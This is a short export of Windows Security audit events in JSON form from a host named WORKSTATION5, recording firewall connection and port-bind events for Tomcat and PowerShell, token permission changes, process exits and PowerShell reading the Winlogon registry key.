{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:05.21Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"ProcessID\"\u003e3936\u003c/Data\u003e\r\n  \u003cData Name=\"Application\"\u003e\\device\\harddiskvolume2\\programdata\\chocolatey\\lib\\tomcat\\tools\\apache-tomcat-9.0.62\\bin\\tomcat9.exe\u003c/Data\u003e\r\n  \u003cData Name=\"Direction\"\u003e%%14592\u003c/Data\u003e\r\n  \u003cData Name=\"SourceAddress\"\u003e192.168.3.5\u003c/Data\u003e\r\n  \u003cData Name=\"SourcePort\"\u003e50452\u003c/Data\u003e\r\n  \u003cData Name=\"DestAddress\"\u003e192.168.2.5\u003c/Data\u003e\r\n  \u003cData Name=\"DestPort\"\u003e8080\u003c/Data\u003e\r\n  \u003cData Name=\"Protocol\"\u003e6\u003c/Data\u003e\r\n  \u003cData Name=\"FilterRTID\"\u003e68996\u003c/Data\u003e\r\n  \u003cData Name=\"LayerName\"\u003e%%14610\u003c/Data\u003e\r\n  \u003cData Name=\"LayerRTID\"\u003e44\u003c/Data\u003e\r\n  \u003cData Name=\"RemoteUserID\"\u003eS-1-0-0\u003c/Data\u003e\r\n  \u003cData Name=\"RemoteMachineID\"\u003eS-1-0-0\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":5156,"Activity":"5156 - The Windows Filtering Platform has allowed a connection.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:05.223Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e7716\u003c/Data\u003e\r\n  \u003cData Name=\"Application\"\u003e\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"SourceAddress\"\u003e0.0.0.0\u003c/Data\u003e\r\n  \u003cData Name=\"SourcePort\"\u003e54217\u003c/Data\u003e\r\n  \u003cData Name=\"Protocol\"\u003e6\u003c/Data\u003e\r\n  \u003cData Name=\"FilterRTID\"\u003e0\u003c/Data\u003e\r\n  \u003cData Name=\"LayerName\"\u003e%%14608\u003c/Data\u003e\r\n  \u003cData Name=\"LayerRTID\"\u003e36\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":5158,"Activity":"5158 - The Windows Filtering Platform has permitted a bind to a local port.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:05.223Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"ProcessID\"\u003e7716\u003c/Data\u003e\r\n  \u003cData Name=\"Application\"\u003e\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"Direction\"\u003e%%14593\u003c/Data\u003e\r\n  \u003cData Name=\"SourceAddress\"\u003e192.168.2.5\u003c/Data\u003e\r\n  \u003cData Name=\"SourcePort\"\u003e54217\u003c/Data\u003e\r\n  \u003cData Name=\"DestAddress\"\u003e169.254.169.254\u003c/Data\u003e\r\n  \u003cData Name=\"DestPort\"\u003e80\u003c/Data\u003e\r\n  \u003cData Name=\"Protocol\"\u003e6\u003c/Data\u003e\r\n  \u003cData Name=\"FilterRTID\"\u003e69359\u003c/Data\u003e\r\n  \u003cData Name=\"LayerName\"\u003e%%14611\u003c/Data\u003e\r\n  \u003cData Name=\"LayerRTID\"\u003e48\u003c/Data\u003e\r\n  \u003cData Name=\"RemoteUserID\"\u003eS-1-0-0\u003c/Data\u003e\r\n  \u003cData Name=\"RemoteMachineID\"\u003eS-1-0-0\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":5156,"Activity":"5156 - The Windows Filtering Platform has allowed a connection.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:05.863Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e7716\u003c/Data\u003e\r\n  \u003cData Name=\"Application\"\u003e\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"SourceAddress\"\u003e0.0.0.0\u003c/Data\u003e\r\n  \u003cData Name=\"SourcePort\"\u003e54223\u003c/Data\u003e\r\n  \u003cData Name=\"Protocol\"\u003e6\u003c/Data\u003e\r\n  \u003cData Name=\"FilterRTID\"\u003e0\u003c/Data\u003e\r\n  \u003cData Name=\"LayerName\"\u003e%%14608\u003c/Data\u003e\r\n  \u003cData Name=\"LayerRTID\"\u003e36\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":5158,"Activity":"5158 - The Windows Filtering Platform has permitted a bind to a local port.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:05.863Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"ProcessID\"\u003e7716\u003c/Data\u003e\r\n  \u003cData Name=\"Application\"\u003e\\device\\harddiskvolume2\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"Direction\"\u003e%%14593\u003c/Data\u003e\r\n  \u003cData Name=\"SourceAddress\"\u003e192.168.2.5\u003c/Data\u003e\r\n  \u003cData Name=\"SourcePort\"\u003e54223\u003c/Data\u003e\r\n  \u003cData Name=\"DestAddress\"\u003e169.254.169.254\u003c/Data\u003e\r\n  \u003cData Name=\"DestPort\"\u003e80\u003c/Data\u003e\r\n  \u003cData Name=\"Protocol\"\u003e6\u003c/Data\u003e\r\n  \u003cData Name=\"FilterRTID\"\u003e69359\u003c/Data\u003e\r\n  \u003cData Name=\"LayerName\"\u003e%%14611\u003c/Data\u003e\r\n  \u003cData Name=\"LayerRTID\"\u003e48\u003c/Data\u003e\r\n  \u003cData Name=\"RemoteUserID\"\u003eS-1-0-0\u003c/Data\u003e\r\n  \u003cData Name=\"RemoteMachineID\"\u003eS-1-0-0\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":5156,"Activity":"5156 - The Windows Filtering Platform has allowed a connection.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:06.467Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e2584\u003c/Data\u003e\r\n  \u003cData Name=\"Application\"\u003e\\device\\harddiskvolume2\\windows\\system32\\svchost.exe\u003c/Data\u003e\r\n  \u003cData Name=\"SourceAddress\"\u003e::\u003c/Data\u003e\r\n  \u003cData Name=\"SourcePort\"\u003e55121\u003c/Data\u003e\r\n  \u003cData Name=\"Protocol\"\u003e17\u003c/Data\u003e\r\n  \u003cData Name=\"FilterRTID\"\u003e0\u003c/Data\u003e\r\n  \u003cData Name=\"LayerName\"\u003e%%14608\u003c/Data\u003e\r\n  \u003cData Name=\"LayerRTID\"\u003e36\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":5158,"Activity":"5158 - The Windows Filtering Platform has permitted a bind to a local port.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:06.467Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e2584\u003c/Data\u003e\r\n  \u003cData Name=\"Application\"\u003e\\device\\harddiskvolume2\\windows\\system32\\svchost.exe\u003c/Data\u003e\r\n  \u003cData Name=\"SourceAddress\"\u003e::\u003c/Data\u003e\r\n  \u003cData Name=\"SourcePort\"\u003e55121\u003c/Data\u003e\r\n  \u003cData Name=\"Protocol\"\u003e17\u003c/Data\u003e\r\n  \u003cData Name=\"FilterRTID\"\u003e0\u003c/Data\u003e\r\n  \u003cData Name=\"LayerName\"\u003e%%14608\u003c/Data\u003e\r\n  \u003cData Name=\"LayerRTID\"\u003e38\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":5158,"Activity":"5158 - The Windows Filtering Platform has permitted a bind to a local port.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:07.1Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e3936\u003c/Data\u003e\r\n  \u003cData Name=\"Application\"\u003e\\device\\harddiskvolume2\\programdata\\chocolatey\\lib\\tomcat\\tools\\apache-tomcat-9.0.62\\bin\\tomcat9.exe\u003c/Data\u003e\r\n  \u003cData Name=\"SourceAddress\"\u003e::\u003c/Data\u003e\r\n  \u003cData Name=\"SourcePort\"\u003e54225\u003c/Data\u003e\r\n  \u003cData Name=\"Protocol\"\u003e6\u003c/Data\u003e\r\n  \u003cData Name=\"FilterRTID\"\u003e0\u003c/Data\u003e\r\n  \u003cData Name=\"LayerName\"\u003e%%14608\u003c/Data\u003e\r\n  \u003cData Name=\"LayerRTID\"\u003e36\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":5158,"Activity":"5158 - The Windows Filtering Platform has permitted a bind to a local port.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:07.1Z","SourceSystem":"OpsManager","Account":"WORKGROUP\\WORKSTATION5$","AccountType":"Machine","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-18\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eWORKSTATION5$\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eWORKGROUP\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e7\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectServer\"\u003eSecurity\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectType\"\u003eToken\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectName\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"HandleId\"\u003e0x79c\u003c/Data\u003e\r\n  \u003cData Name=\"OldSd\"\u003eD:(A;;GA;;;SY)(A;;GA;;;LS)\u003c/Data\u003e\r\n  \u003cData Name=\"NewSd\"\u003eD:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-86-1544737700-199408000-2549878335-3519669259-381336952)\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0xc4c\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\svchost.exe\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4670,"Activity":"4670 - Permissions on an object were changed.","HandleId":"0x79c","ObjectName":"-","ObjectServer":"Security","ObjectType":"Token","Process":"svchost.exe","ProcessId":"0xc4c","ProcessName":"C:\\Windows\\System32\\svchost.exe","SubjectAccount":"WORKGROUP\\WORKSTATION5$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","SubjectUserName":"WORKSTATION5$","SubjectUserSid":"S-1-5-18","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:07.1Z","SourceSystem":"OpsManager","Account":"WORKGROUP\\WORKSTATION5$","AccountType":"Machine","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-18\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eWORKSTATION5$\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eWORKGROUP\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e7\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectServer\"\u003eSecurity\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectType\"\u003eToken\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectName\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"HandleId\"\u003e0x79c\u003c/Data\u003e\r\n  \u003cData Name=\"OldSd\"\u003eD:(A;;GA;;;SY)(A;;GA;;;LS)\u003c/Data\u003e\r\n  \u003cData Name=\"NewSd\"\u003eD:(A;;GA;;;SY)(A;;RC;;;OW)(A;;GA;;;S-1-5-86-1544737700-199408000-2549878335-3519669259-381336952)\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0xc4c\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\svchost.exe\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4670,"Activity":"4670 - Permissions on an object were changed.","HandleId":"0x79c","ObjectName":"-","ObjectServer":"Security","ObjectType":"Token","Process":"svchost.exe","ProcessId":"0xc4c","ProcessName":"C:\\Windows\\System32\\svchost.exe","SubjectAccount":"WORKGROUP\\WORKSTATION5$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","SubjectUserName":"WORKSTATION5$","SubjectUserSid":"S-1-5-18","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:07.49Z","SourceSystem":"OpsManager","Account":"WORKGROUP\\WORKSTATION5$","AccountType":"Machine","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-18\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eWORKSTATION5$\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eWORKGROUP\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e7\u003c/Data\u003e\r\n  \u003cData Name=\"Status\"\u003e0x0\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0x1e24\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4689,"Activity":"4689 - A process has exited.","Process":"powershell.exe","ProcessId":"0x1e24","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","Status":"0x0","SubjectAccount":"WORKGROUP\\WORKSTATION5$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","SubjectUserName":"WORKSTATION5$","SubjectUserSid":"S-1-5-18","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:07.507Z","SourceSystem":"OpsManager","Account":"WORKGROUP\\WORKSTATION5$","AccountType":"Machine","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-18\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eWORKSTATION5$\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eWORKGROUP\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e7\u003c/Data\u003e\r\n  \u003cData Name=\"Status\"\u003e0x0\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0x2e94\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\conhost.exe\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4689,"Activity":"4689 - A process has exited.","Process":"conhost.exe","ProcessId":"0x2e94","ProcessName":"C:\\Windows\\System32\\conhost.exe","Status":"0x0","SubjectAccount":"WORKGROUP\\WORKSTATION5$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","SubjectUserName":"WORKSTATION5$","SubjectUserSid":"S-1-5-18","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:07.507Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-18\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eWORKSTATION5$\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eWORKGROUP\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e7\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectServer\"\u003eSecurity\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectType\"\u003eKey\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectName\"\u003e\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u003c/Data\u003e\r\n  \u003cData Name=\"HandleId\"\u003e0x844\u003c/Data\u003e\r\n  \u003cData Name=\"TransactionId\"\u003e{00000000-0000-0000-0000-000000000000}\u003c/Data\u003e\r\n  \u003cData Name=\"AccessList\"\u003e%%1538 \t\t\t\t%%4432 \t\t\t\t%%4435 \t\t\t\t%%4436 \t\t\t\t\u003c/Data\u003e\r\n  \u003cData Name=\"AccessReason\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"AccessMask\"\u003e0x20019\u003c/Data\u003e\r\n  \u003cData Name=\"PrivilegeList\"\u003e-\u003c/Data\u003e\r\n  \u003cData Name=\"RestrictedSidCount\"\u003e0\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0x1e24\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"ResourceAttributes\"\u003e-\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4656,"Activity":"4656 - A handle to an object was requested.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:07.507Z","SourceSystem":"OpsManager","Account":"WORKGROUP\\WORKSTATION5$","AccountType":"Machine","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"SubjectUserSid\"\u003eS-1-5-18\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectUserName\"\u003eWORKSTATION5$\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectDomainName\"\u003eWORKGROUP\u003c/Data\u003e\r\n  \u003cData Name=\"SubjectLogonId\"\u003e0x3e7\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectServer\"\u003eSecurity\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectType\"\u003eKey\u003c/Data\u003e\r\n  \u003cData Name=\"ObjectName\"\u003e\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u003c/Data\u003e\r\n  \u003cData Name=\"HandleId\"\u003e0x844\u003c/Data\u003e\r\n  \u003cData Name=\"AccessList\"\u003e%%4432 \t\t\t\t\u003c/Data\u003e\r\n  \u003cData Name=\"AccessMask\"\u003e0x1\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e0x1e24\u003c/Data\u003e\r\n  \u003cData Name=\"ProcessName\"\u003eC:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\u003c/Data\u003e\r\n  \u003cData Name=\"ResourceAttributes\"\u003e-\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":4663,"Activity":"4663 - An attempt was made to access an object.","AccessList":"%%4432 \t\t\t\t","AccessMask":"0x1","HandleId":"0x844","ObjectName":"\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon","ObjectServer":"Security","ObjectType":"Key","Process":"powershell.exe","ProcessId":"0x1e24","ProcessName":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","SubjectAccount":"WORKGROUP\\WORKSTATION5$","SubjectDomainName":"WORKGROUP","SubjectLogonId":"0x3e7","SubjectUserName":"WORKSTATION5$","SubjectUserSid":"S-1-5-18","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
{"TenantId":"redacted","TimeGenerated":"2022-05-13T08:54:07.507Z","SourceSystem":"OpsManager","Computer":"WORKSTATION5","EventSourceName":"Microsoft-Windows-Security-Auditing","Channel":"Security","Task":1,"Level":"0","EventData":"\u003cEventData xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"\u003e\r\n  \u003cData Name=\"ProcessId\"\u003e3936\u003c/Data\u003e\r\n  \u003cData Name=\"Application\"\u003e\\device\\harddiskvolume2\\programdata\\chocolatey\\lib\\tomcat\\tools\\apache-tomcat-9.0.62\\bin\\tomcat9.exe\u003c/Data\u003e\r\n  \u003cData Name=\"SourceAddress\"\u003e::\u003c/Data\u003e\r\n  \u003cData Name=\"SourcePort\"\u003e54225\u003c/Data\u003e\r\n  \u003cData Name=\"Protocol\"\u003e6\u003c/Data\u003e\r\n  \u003cData Name=\"FilterRTID\"\u003e0\u003c/Data\u003e\r\n  \u003cData Name=\"LayerName\"\u003e%%14608\u003c/Data\u003e\r\n  \u003cData Name=\"LayerRTID\"\u003e38\u003c/Data\u003e\r\n\u003c/EventData\u003e","EventID":5158,"Activity":"5158 - The Windows Filtering Platform has permitted a bind to a local port.","SourceComputerId":"29acc230-2f13-49db-9ef2-c9b20229a10d","EventOriginId":"29acc230-2f13-49db-9ef2-c9b20229a10c","MG":"00000000-0000-0000-0000-000000000001","TimeCollected":"2022-05-13T08:54:38.145Z","ManagementGroupName":"AOI-redacted","Type":"SecurityEvent","_ResourceId":"/subscriptions/redacted/resourcegroups/redacted/providers/microsoft.compute/virtualmachines/workstation5"}
